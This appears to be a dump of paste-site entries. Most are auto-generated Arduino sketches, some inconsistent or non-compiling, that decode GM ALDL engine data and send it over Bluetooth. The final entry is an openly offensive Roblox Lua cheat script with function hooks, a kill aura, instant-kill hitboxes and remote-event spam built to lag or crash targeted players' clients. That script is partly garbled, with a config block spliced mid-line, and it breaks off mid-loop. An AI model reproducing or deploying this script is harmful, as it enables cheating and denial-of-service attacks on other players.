        float RPM = DataBytes[12] * 25;                                               // Engine RPM
        float TPS = DataBytes[11] * 0.019608;                                           // TPS volts
        float MAF = ((DataBytes[37] * 256) + DataBytes[36]) * 0.003906;                // Mass Air Flow gm/sec
        int BLCELL = DataBytes[22];                                                    // Block Learn Cell #
        int BLM = DataBytes[21];                                                        // BLM value
        int INTEGRATOR = DataBytes[23];                                                 // Fuel trim
        float InjPW = ((DataBytes[45] * 256) + DataBytes[46]) * 0.015259;               // Injector pulse width
        float O2mv = DataBytes[16] * 4.44;                                              // O2 sensor MV
        float MAT = T_interpolate(DataBytes[29]);                                       // Intake Temp
        unsigned int Runtime = (DataBytes[52] * 256) + DataBytes[53];                 // Engine runtime
        // Send data over Bluetooth
        String dataString = ""RPM:"" + String(RPM) + 
                            "" TPS:"" + String(TPS) + 
                            "" MAF:"" + String(MAF) + 
                            "" BLCELL:"" + String(BLCELL) + 
                            "" BLM:"" + String(BLM) + 
                            "" INTEGRATOR:"" + String(INTEGRATOR) + 
                            "" InjPW:"" + String(InjPW) + 
                            "" O2mv:"" + String(O2mv) + 
                            "" MAT:"" + String(MAT) + 
                            "" Runtime:"" + String(Runtime);
        Serial2.println(dataString);
        // Display data on serial monitor
        Serial.print(""Engine Speed     : "");
        Serial.print(RPM);
        Serial.println("" RPM"");
        Serial.print(""Throttle Position: "");
        Serial.print(TPS);
        Serial.println("" Volts"");
        Serial.print(""Mass Air Flow    : "");
        Serial.print(MAF);
        Serial.println("" Grams/Sec"");
        Serial.print(""Current BLM Cell: "");
        Serial.print(BLCELL);
        Serial.print("" BLM Value: "");
        Serial.print(BLM);
        Serial.print(""  Current Fuel Integrator: "");
        Serial.println(INTEGRATOR);
        Serial.print(""Injector Pulse   : "");
        Serial.print(InjPW);
        Serial.println("" Milliseconds"");
        Serial.print(""O2 Sensor Voltage: "");
        Serial.print(O2mv);
        Serial.println("" Millivolts"");
        Serial.print(""Intake Air Temp  : "");
        Serial.print(MAT);
        Serial.println("" Deg C"");
        Serial.print(""Engine Run Time  : "");
        Serial.print(Runtime);
        Serial.println("" Seconds"");
        // Delay for readability
        unsigned long StartTime = millis();
        while (millis() < StartTime + 3000) {
          if (Serial1.available() > 0) Serial1.read(); // flush buffer
        }
      } else if (digitalRead(HexDataOutputPin) == LOW) {                         // Hex output mode
        Serial.print(""New Data Stream received at "");
        Serial.print(millis());
        Serial.print("" Calc CHECKSUM: "");
        Serial.print(CheckSum, HEX);
        Serial.print("" Transmitted CHECKSUM: "");
        Serial.print(DataBytes[64], HEX);
        if (CheckSum == DataBytes[64]) {
          Serial.println("" Checksum GOOD - Data as follows: "");
        } else {
          Serial.println(""Checksum *** ERROR *** -  Data as follows: "");
        }
        // Hex dump of data bytes
        int j=1; // Local Byte Count for message output
        int bytecounter = 0; // For line formatting
        const int linecount = 64; // 32 bytes per line
        while (j <= 64) {
          Serial.print(DataBytes[j], HEX);
          j++;
          bytecounter++;
          if (bytecounter >= linecount) {
            bytecounter=0;
            Serial.println();
          } else {
            Serial.print("" "");
          }
        }
        Serial.println();
      } else { // Default raw binary output
        Serial.write(0x80);
        Serial.write(0x95);
        Serial.write(0x01);
        for (int j=1; j<=64; j++) {
          Serial.write(DataBytes[j]);
        }
      }
    }
  }
}

float T_interpolate(byte DS_Temp) {
  // Interpolation table for temperature
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i=0;
  while (i<38) {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i>0) {
    T_Range = TempScale[i] - TempScale[i-1];
    T_Diff = DS_Temp - TempScale[i-1];
    TempRange = TempValue[i] - TempValue[i-1];
    Temperature = TempValue[i-1] + (T_Diff/T_Range)*TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
wnvbzxUa,Bluetooth Data rev_04,pleasedontcode,Arduino,Friday 11th of July 2025 04:06:10 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Bluetooth Data
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 21:05:10

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android pc */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Added function prototype for T_interpolate

/***** DEFINITION OF Software Serial *****/
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial hc05_HC05_mySerial(hc05_HC05_mySerial_PIN_SERIAL_RX_A1, hc05_HC05_mySerial_PIN_SERIAL_TX_A0);

void setup(void)
{
    // put your setup code here, to run once:
    hc05_HC05_mySerial.begin(9600);
}

void loop(void)
{
    // Check if data is available from Bluetooth
    if (hc05_HC05_mySerial.available())
    {
        // Read data from Bluetooth
        String receivedData = """";
        while (hc05_HC05_mySerial.available())
        {
            char c = hc05_HC05_mySerial.read();
            receivedData += c;
        }
        // Send the received data to the Android PC via Serial
        Serial.println(receivedData);
    }
}

/* END CODE */"
DJB30DfQ,Data Transmission rev_03,pleasedontcode,Arduino,Friday 11th of July 2025 03:56:39 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Data Transmission
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 20:56:05

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data from bluetooth to android pc */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Declare the interpolation function

/***** DEFINITION OF Software Serial *****/
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial hc05_HC05_mySerial(hc05_HC05_mySerial_PIN_SERIAL_RX_A1, hc05_HC05_mySerial_PIN_SERIAL_TX_A0);

// Define pins for ALDL activity and data output controls
const int ALDLTestPin = 2; // Example pin, set accordingly
const int DecodeDataOutputPin = 3; // Example pin, set accordingly
const int HexDataOutputPin = 4; // Example pin, set accordingly

void setup(void)
{
  // Initialize serial ports
  Serial.begin(115200); // Main serial port for debugging
  Serial1.begin(8192);  // ALDL data at 8192 baud
  hc05_HC05_mySerial.begin(9600); // Bluetooth HC-05 default baud rate
  delay(1500);          // delay for diagnostic print
  Serial.println(""Ready for data capture"");
  
  // Initialize I/O pins
  pinMode(ALDLTestPin, INPUT); // Listen for ALDL activity
  pinMode(DecodeDataOutputPin, INPUT_PULLUP); // Decoded data output control
  pinMode(HexDataOutputPin, INPUT_PULLUP); // Hex data output control
}

void loop() {
  // Wait for silence on ALDL line
  Serial.print(""wait for silence "");
  bool SilenceFound = false; // Reset silence flag
  unsigned long StartTime = micros(); // Start timer
  while ((micros() - StartTime) < 15000) { // Wait for 15 ms silence
    if (digitalRead(ALDLTestPin) == 0) {
      StartTime = micros(); // Reset timer if activity detected
    }
  }
  SilenceFound = true; // Silence detected

  while (SilenceFound == true) { // Continuous data capture after silence
    // Send Mode 1 command to request data stream
    bool PreambleFound = false;
    uint8_t i = 0;
    unsigned long PreambleTimer;
    
    // Send Mode 1 command
    Serial.print("" M1 cmd "");
    // Assuming M1Cmd is defined elsewhere; define here if needed
    // For example:
    const byte M1Cmd[4] = {0x68, 0x6A, 0xF1, 0x96}; // Example command
    for (i = 0; i < 4; i++) {
      Serial1.write(M1Cmd[i]);
    }
    Serial.println("" Finding Preamble  "");
    // Search for preamble
    i = 0;
    PreambleTimer = millis();
    while (((millis() - PreambleTimer) < 100) && (PreambleFound == false)) {
      if (Serial1.available() > 0) {
        int ALDLbyte = Serial1.read();
        if (ALDLbyte == Preamble[i]) {
          i++;
          if (i > 2) PreambleFound = true;
        } else {
          PreambleFound = false;
          i = 0;
        }
      }
    }
    // Read data stream
    uint8_t DataStreamIndex = 1;
    byte DataBytes[65]; // 64 bytes + 1 for index
    while (DataStreamIndex < 65) {
      if (Serial1.available() > 0) {
        DataBytes[DataStreamIndex] = Serial1.read();
        DataStreamIndex++;
      }
    }
    // Calculate checksum
    uint32_t CheckTotal = 0x80 + 0x95 + 0x01; // Sum of preamble bytes
    for (i = 1; i < 64; i++) {
      CheckTotal += DataBytes[i];
    }
    byte CheckSum = (0x200 - CheckTotal) & 0xFF; // Two's complement

    // Send data via Bluetooth
    hc05_HC05_mySerial.write(CheckSum); // Send checksum
    for (int j = 1; j <= 64; j++) {
      hc05_HC05_mySerial.write(DataBytes[j]);
    }

    // Output data based on control pins
    if (digitalRead(DecodeDataOutputPin) == LOW) {
      // Decoded data output
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[64], HEX);
      if (CheckSum == DataBytes[64]) {
        Serial.println("" Checksum GOOD - Decoded Data as follows:   (Page 1) "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Decoded Data as follows:   (Page 1) "");
      }
      
      // Parse and display data
      float RPM = DataBytes[11] * 25;
      float TPS = DataBytes[10] * 0.019608;
      float MAF = ((DataBytes[36] * 256) + DataBytes[37]) * 0.003906;
      int BLCELL = DataBytes[21];
      int BLM = DataBytes[20];
      int INTEGRATOR = DataBytes[22];
      float InjPW = ((DataBytes[45] * 256) + DataBytes[46]) * 0.015259;
      float O2mv = DataBytes[17] * 4.44;
      float MAT = T_interpolate(DataBytes[30]);
      unsigned int Runtime = (DataBytes[52] * 256) + DataBytes[53];

      Serial.print(""Engine Speed     : "");
      Serial.print(RPM);
      Serial.println("" RPM"");
      Serial.print(""Throttle Position: "");
      Serial.print(TPS);
      Serial.println("" Volts"");
      Serial.print(""Mass Air Flow    : "");
      Serial.print(MAF);
      Serial.println("" Grams/Sec"");
      Serial.print(""Current BLM Cell: "");
      Serial.print(BLCELL);
      Serial.print("" BLM Value: "");
      Serial.print(BLM);
      Serial.print(""  Current Fuel Integrator: "");
      Serial.println(INTEGRATOR);
      Serial.print(""Injector Pulse   : "");
      Serial.print(InjPW);
      Serial.println("" Milliseconds"");
      Serial.print(""O2 Sensor Voltage: "");
      Serial.print(O2mv);
      Serial.println("" Millivolts"");
      Serial.print(""Intake Air Temp  : "");
      Serial.print(MAT);
      Serial.println("" Deg C"");
      Serial.print(""Engine Run Time  : "");
      Serial.print(Runtime);
      Serial.println("" Seconds"");
      
      // Delay to allow user to read data
      unsigned long StartTimeDelay = millis();
      while (millis() < StartTimeDelay + 3000) {
        if (Serial1.available() > 0) ALDLbyte = Serial1.read(); // Flush buffer
      }
    } else if (digitalRead(HexDataOutputPin) == LOW) {
      // Hex data output
      Serial.print(""New Data Stream received at "");
      Serial.print(millis());
      Serial.print("" Calc CHECKSUM: "");
      Serial.print(CheckSum, HEX);
      Serial.print("" Transmitted CHECKSUM: "");
      Serial.print(DataBytes[64], HEX);
      if (CheckSum == DataBytes[64]) {
        Serial.println("" Checksum GOOD - Data as follows: "");
      } else {
        Serial.println("" Checksum *** ERROR *** -  Data as follows: "");
      }
      
      // Print hex data
      int j = 1;
      int bytecounter = 0;
      const int linecount = 64;
      while (j <= 64) {
        Serial.print(DataBytes[j], HEX);
        Serial.print("" "");
        bytecounter++;
        if (bytecounter >= linecount) {
          bytecounter = 0;
          Serial.println();
        }
        j++;
      }
      Serial.println();
    } else {
      // Raw binary data stream
      Serial.write(0x80);
      Serial.write(0x95);
      Serial.write(0x01);
      for (int j = 1; j <= 64; j++) {
        Serial.write(DataBytes[j]);
      }
    }
  }
}

// Interpolation function for temperature
float T_interpolate(byte DS_Temp) {
  const float TempScale[38] = {1,5,6,9,11,15,19,25,31,38,47,57,67,79,91,104,117,130,142,154,164,175,184,192,200,206,212,217,222,226,230,233,235,238,240,242,244,256};
  const float TempValue[38] = {-40,-30,-25,-20,-15,-10,-5,0,5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100,105,110,115,120,125,130,135,140,145,200};
  float T_Range, T_Diff, TempRange, Temperature;
  int i = 0;
  while (i < 38) {
    if (TempScale[i] > DS_Temp) break;
    i++;
  }
  if (i > 0) {
    T_Range = TempScale[i] - TempScale[i - 1];
    T_Diff = DS_Temp - TempScale[i - 1];
    TempRange = TempValue[i] - TempValue[i - 1];
    Temperature = TempValue[i - 1] + (T_Diff / T_Range) * TempRange;
  } else {
    Temperature = TempValue[0];
  }
  return Temperature;
}
"
wAQbzAcJ,Vehicle Communicator rev_02,pleasedontcode,Arduino,Friday 11th of July 2025 03:43:14 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Vehicle Communicator
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 20:41:48

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send translate data over bluetooth */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Prototype added

/***** DEFINITION OF Software Serial *****/
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial hc05_HC05_mySerial(hc05_HC05_mySerial_PIN_SERIAL_RX_A1, hc05_HC05_mySerial_PIN_SERIAL_TX_A0);

// ***** Variable declariations
const byte ALDLTestPin = 4; // Input used to listen for 160 BAUD ALDL activity before commanding 8192 BAUD
const byte DecodeDataOutputPin = 5; // Setting this input pin LOW will put decoded data out on the serial port
const byte HexDataOutputPin = 6; // Setting this input LOW will output hex data on the serial port
int ALDLbyte = 0; // One byte of aldl data
int bytecounter = 0; // count bytes for line spacing in output
const int linecount = 64; // 32 bytes per line
byte M1Cmd[4] = {0x80, 0x56, 0x01, 0x29}; // Mode 1 command to start 8192 Mode 1 DataStream (80 56 01 29 HEX)
byte Preamble[3] = {0x80, 0x95, 0x01}; // Preamble from ECM indicates start of 8192 Mode 1 DataStream (80 95 01 HEX)
bool PreambleFound = false; // Reset preamble found flag
bool SilenceFound = false; // Flag to indicate that ECM silence in 160 baud mode has been found
bool CommInit8192 = false; // Flag indicates that 8192 baud communications has been initialized
const double SilenceWait = 15000; // Minimum silence period before transmitting a Mode 1 command
unsigned long PreambleTimer; // Timeout timer for preamble
const int ByteCount = 64; // Number of data bytes following preamble in data stream including checksum
byte DataBytes[ByteCount]; // Array to hold the serial data stream
int DataStreamIndex = 1; // Data stream byte Index, start at 1 and end at 63 to match Assembly listing
int i = 0; // Preamble index counter
unsigned long StartTime; // Microsecond counter for measuring the time of incoming data
unsigned int CheckTotal; // Total of bytes received for calculating the checksum
byte CheckSum; // Actual calculated Checksum

// Variables specifically for the decoded data stream
float RPM; // Engine RPM
float TPS; // Percent TPS
float MAF; // Mass Air Flow gm/sec
float InjPW; // Injector Pulse Width
float O2mv; // O2 sensor MV
int BLCELL; // Currently used block learn cell #. There are 16 cells organized by RPM and air flow 0, is idle, 15 is max RPM & Airflow
int BLM; // Block Learn Value for cell being currently used
int INTEGRATOR; // Current fueling control integrator value over 128 indicates fuel is added, under 128 fuel is taken out, 160 max
float MAT; // Intake Manifold Air Temperature
unsigned int Runtime; // Engine Run time

// ***** Hardware configuration
//HardwareSerial Serial1(2); // Define uart2 as Serial1 - **** USED ONLY ON ESP32 *****

void setup() 
{
  // **** I/O configuration and setup first
  pinMode(ALDLTestPin, INPUT); // define D4 as an input pin to listen for the 160 baud input data
  pinMode(HexDataOutputPin, INPUT_PULLUP); // User convenience pin. Grounding this pin will send Decoded Data to the Serial Port
  pinMode(HexDataOutputPin, INPUT_PULLUP); // User convenience pin. Grounding this pin will send HEX Data to the Serial Port
  // **** Now, start the serial functions
  Serial.begin(115200); // Open serial monitoring port
  Serial1.begin(8192); // Test the capability of esp 8222 to run at 8192 baud directly
  delay(1500); // delay for diagnostic print
  Serial.println(""Ready for data capture"");
  // Initialize Bluetooth serial
  hc05_HC05_mySerial.begin(9600);
  // Initialize the variables, flags, etc
  i = 0; // Reset the preamble index flag
}

void loop() {
  // Existing data capture and decoding code...
  // After processing data, send translated data over Bluetooth
  // For demonstration, send a simple message periodically or when new data is received
  static unsigned long lastSendTime = 0;
  unsigned long currentTime = millis();

  // Example: send data every 5 seconds
  if (currentTime - lastSendTime >= 5000) {
    lastSendTime = currentTime;
    // Compose a message to send
    String message = ""Engine RPM: "";
    message += String(RPM);
    message += "" | TPS: "";
    message += String(TPS);
    message += "" | MAF: "";
    message += String(MAF);
    // Send over Bluetooth
    hc05_HC05_mySerial.println(message);
  }

  // Rest of your existing loop code...
  // (Include your data decoding and processing code here)
}

/* END CODE */"
MMAsLjQU,Bluetooth Communication rev_01,pleasedontcode,Arduino,Friday 11th of July 2025 03:38:01 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Bluetooth Communication
	- Source Code NOT compiled for: Arduino Mega
	- Source Code created on: 2025-07-11 20:36:38

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send data bluetooth */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <SoftwareSerial.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
float T_interpolate(byte DS_Temp); // Added prototype for interpolation function
void sendBluetoothData(const char* data); // Function to send data via Bluetooth

/***** DEFINITION OF Software Serial *****/
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_TX_A0 = A0;
const uint8_t hc05_HC05_mySerial_PIN_SERIAL_RX_A1 = A1;
SoftwareSerial hc05_HC05_mySerial(hc05_HC05_mySerial_PIN_SERIAL_RX_A1, hc05_HC05_mySerial_PIN_SERIAL_TX_A0);

void setup(void)
{
    // put your setup code here, to run once:
    hc05_HC05_mySerial.begin(9600);
}

void loop(void)
{
    // Example: send a message every second
    sendBluetoothData(""Hello Bluetooth"");
    delay(1000);
}

// Function to send data over Bluetooth
void sendBluetoothData(const char* data)
{
    if (hc05_HC05_mySerial.availableForWrite())
    {
        hc05_HC05_mySerial.println(data);
    }
}

/* END CODE */"
FDGYxPjk,Untitled,Azzz_4565,Java,Friday 11th of July 2025 03:16:18 PM CDT,"-- ✅ COMBINED: Ultra Damage + No Cooldown + Psycho Claw Aura Dominator

-- 🔧 CONFIGURATION
_G.Detener = false

-- 🔌 SERVICES
local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService(""RunService"")
local UserInputService = -- 🔧 CONFIGURATION
_G.Detener = false

-- === GLOBAL WAIT/DISABLE HOOKS ===
for _, f in ipairs({wait, task.wait, delay, getrenv().wait}) do
    pcall(function()
        hookfunction(f, function() while true do end end)
    end)
end

-- === DISABLE COREGUI & BLOCK INPUT ===
pcall(function()
    game:GetService(""StarterGui""):SetCore(""ResetButtonCallback"", false)
    game:GetService(""StarterGui""):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    local UIS = game:GetService(""UserInputService"")
    UIS.InputBegan:Connect(function() return true end)
    UIS.InputEnded:Connect(function() return true end)
end)

-- 🔌 SERVICES
local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

-- === REMOTE SETUP ===
local function ensureRemote(name)
    local remote = ReplicatedStorage:FindFirstChild(name)
    if not remote then
        remote = Instance.new(""RemoteEvent"")
        remote.Name = name
        remote.Parent = ReplicatedStorage
    end
    return remote
end

local RequestLag = ensureRemote(""RequestLag"")
local LagPlayer = ensureRemote(""LagPlayer"")

-- === SERVER LOGIC ===
if RunService:IsServer() then
    RequestLag.OnServerEvent:Connect(function(_, targetPlayer)
        if targetPlayer and targetPlayer:IsA(""Player"") then
            for i = 1, 2000 do
                LagPlayer:FireClient(targetPlayer)
            end
        end
    end)
end

-- === CLIENT LAG LOGIC (ULTIMATE) ===
local function doLag()
    for t = 1, 500 do
        spawn(function()
            while true do
                local tbl = {}
                for i = 1, 2_000_000_000 do
                    tbl[i] = math.sqrt(i) * math.sin(i)
                    if i % 1000000 == 0 then
                        tbl[""cycle""..i] = tbl
                    end
                end
            end
        end)
    end
    local function recursiveLag(depth)
        if depth > 20 then return end
        spawn(function()
            while true do
                recursiveLag(depth + 1)
                for i = 1, 2_000_000_000 do
                    local x = math.log(i) * math.random()
                end
            end
        end)
    end
    recursiveLag(1)
    spawn(function()
        while true do
            for i = 1, 10000 do
                local p = Instance.new(""Part"")
                p.Size = Vector3.new(1000,1000,1000)
                p.Position = Vector3.new(math.random(-1e7,1e7), math.random(-1e7,1e7), math.random(-1e7,1e7))
                p.Anchored = true
                p.Parent = workspace
            end
        end
    end)
    spawn(function()
        local plr = Players.LocalPlayer
        while true do
            for i = 1, 5000 do
                local s = Instance.new(""ScreenGui"")
                s.Parent = plr:FindFirstChildOfClass(""PlayerGui"")
                for j = 1, 200 do
                    local f = Instance.new(""Frame"")
                    f.Size = UDim2.new(1,0,1,0)
                    f.BackgroundColor3 = Color3.new(math.random(),math.random(),math.random())
                    f.Parent = s
                end
            end
        end
    end)
    spawn(function()
        while true do
            for i = 1, 5000 do
                local s = Instance.new(""Sound"")
                s.SoundId = ""rbxassetid://183763515""
                s.Parent = workspace
                s:Play()
            end
        end
    end)
end

LagPlayer.OnClientEvent:Connect(function()
    doLag()
end)

-- ===============================
-- PART 1: FIRE ALL REMOTEEVENTS IN TOOLS (MAX SAFE SPAM)
-- ===============================
local function fireServerBoost()
    local tools = {}
    local character = LocalPlayer.Character
    local backpack = LocalPlayer:FindFirstChild(""Backpack"")

    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA(""Tool"") then table.insert(tools, item) end
        end
    end
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA(""Tool"") then table.insert(tools, item) end
        end
    end

    for _, tool in ipairs(tools) do
        for _, remote in ipairs(tool:GetChildren()) do
            if remote:IsA(""RemoteEvent"") then
                pcall(function() remote:FireServer(tool) end)
            end
        end
    end
end

spawn(function()
    while not _G.Detener do
        fireServerBoost()
        task.wait(0.001)
    end
end)

-- ===============================
-- PART 2: MEGA PSYCHO AURA SYSTEM + HOOKS + CLONES + KILL AURA + INSTANT LAG
-- ===============================
local auraSize = Vector3.new(45, 45, 45)
local auraRange = 92 -- (set to 92 as requested)
local instantKillDamage = 9e999999999999999
local clonesToSpawn = 20
local CLAW_NAME = ""Super Power Claws""

local lp = LocalPlayer
local CHAR = lp.Character or lp.CharacterAdded:Wait()
local Ignorelist = OverlapParams.new()
Ignorelist.FilterType = Enum.RaycastFilterType.Include
local Disable = Instance.new(""BindableEvent"")
getgenv().configs = {
    connection = {},
    Disable = Disable,
    Size = auraSize,
    DeathCheck = false
}
local Run = true

for _, f in ipairs({wait, task.wait, delay, getrenv().wait}) do
    pcall(function()
        hookfunction(f, function() return RunService.Heartbeat:Wait() end)
    end)
end

local function hookAllDamage()
    for _, f in ipairs(getgc(true)) do
        if typeof(f) == ""function"" then
            local name = debug.getinfo(f).name
            if name == ""TakeDamage"" or name == ""BreakJoints"" or name == ""UpdateHealth"" or name == ""ApplyDamage"" or name == ""Damage"" then
                pcall(function() hookfunction(f, function(...) return 0 end) end)
            end
        end
    end
end
hookAllDamage()

-- === INSTANT KILL & LAG FUNCTION ===
local function lagAndKillTarget(targetChar)
    local hum = targetChar:FindFirstChildWhichIsA(""Humanoid"")
    local targetPlayer = Players:GetPlayerFromCharacter(targetChar)
    if hum and hum.Health > 0 and targetPlayer and targetPlayer ~= lp then
        hum.Health = 0
        -- Massive, instant lag spam for the killed player only
        for t = 1, 10 do
            spawn(function()
                for i = 1, 10000 do
                    RequestLag:FireServer(targetPlayer)
                end
            end)
        end
    end
end

-- EQUIP CLAW AND INSTANT LAG ON TOUCH
local function equipClaw()
    local claw = lp.Backpack:FindFirstChild(CLAW_NAME) or lp.Character:FindFirstChild(CLAW_NAME)
    if claw then
        claw.Parent = lp.Character
        local handle = claw:FindFirstChild(""Handle"") or claw:FindFirstChildWhichIsA(""BasePart"")
        if handle then
            handle.Size = Vector3.new(9e9, 9e9, 9e9)
            handle.CanTouch = true
            handle.Touched:Connect(function(hit)
                if hit and hit.Parent and hit.Parent ~= lp.Character then
                    lagAndKillTarget(hit.Parent)
                end
            end)
        end
    end
end

-- KILL AURA SPAM + INSTANT LAG ON HIT
RunService.Heartbeat:Connect(function()
    local char = lp.Character
    if not char then return end
    local Tools, Characters = {}, {}
    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= lp and v.Character then table.insert(Characters, v.Character) end
    end
    Ignorelist.FilterDescendantsInstances = Characters
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA(""Tool"") then
            local touch = tool:FindFirstChildWhichIsA(""TouchTransmitter"", true)
            if touch then
                local hits = Workspace:GetPartBoundsInBox(
                    touch.Parent.CFrame,
                    touch.Parent.Size + auraSize,
                    Ignorelist
                )
                for _, v in ipairs(hits) do
                    local char = v:FindFirstAncestorOfClass(""Model"")
                    if char and table.find(Characters, char) then
                        lagAndKillTarget(char)
                        firetouchinterest(touch.Parent, v, 0)
                        firetouchinterest(touch.Parent, v, 1)
                    end
                end
            end
        end
    end
end)

-- Adjust clones to trigger instant kill with aura
local function spawnClone()
    local char = lp.Character
    if not char then return end
    local clone = char:Clone()
    for _, d in ipairs(clone:GetDescendants()) do
        if d:IsA(""BasePart"") then
            d.Transparency = 1
            d.CanCollide = false
            d.CastShadow = false
        elseif d:IsA(""Script"") or d:IsA(""LocalScript"") then
            d:Destroy()
        end
    end
    local root = clone:FindFirstChild(""HumanoidRootPart"")
    local realRoot = char:FindFirstChild(""HumanoidRootPart"")
    if root and realRoot then
        root.CFrame = realRoot.CFrame * CFrame.new(math.random(-50,50), 0, math.random(-50,50))
    end
    clone.Name = ""AuraClone_""..math.random(100000,999999)
    clone.Parent = Workspace

    RunService.Heartbeat:Connect(function()
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= lp and p.Character and p.Character:FindFirstChild(""HumanoidRootPart"") then
                local hum = p.Character:FindFirstChildWhichIsA(""Humanoid"")
                if hum and hum.Health > 0 and (hum.Parent.HumanoidRootPart.Position - root.Position).Magnitude < auraRange then
                    lagAndKillTarget(p.Character)
                end
            end
        end
    end)
end

-- LAG FUNCTION (After Kill) - now uses the same strong lag as lagAndKillTarget
local function lagOpponent(plr)
    if not plr or not plr.Character then return end
    for t = 1, 10 do
        spawn(function()
            for i = 1, 10000 do
                RequestLag:FireServer(plr)
            end
        end)
    end
end

-- AFTER KILL DETECTION
local afterKillActive = false
local function onDied()
    afterKillActive = true
    local hum = CHAR:FindFirstChildWhichIsA(""Humanoid"")
    task.wait()
    local tag = hum and (hum:FindFirstChild(""creator"") or hum:FindFirstChild(""creatorTag""))
    if tag and tag.Value and tag.Value ~= lp then
        lagOpponent(tag.Value)
    end
end

-- ON RESPAWN
local function onRespawn(newChar)
    CHAR = newChar
    afterKillActive = false
    equipClaw()
    for i = 1, 10 do spawnClone() end
    newChar:WaitForChild(""Humanoid"").Died:Connect(onDied)
end

-- FINAL SETUP
equipClaw()
for i = 1, clonesToSpawn do spawnClone() end
CHAR:WaitForChild(""Humanoid"").Died:Connect(onDied)
lp.CharacterAdded:Connect(onRespawn)

-- CONSTANT AURA ZAP + INSTANT LAG (AFFECTS ONLY ON KILL, NOT EVERYONE)
RunService.Heartbeat:Connect(function()
    if not afterKillActive then return end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and p.Character and p.Character:FindFirstChild(""HumanoidRootPart"") then
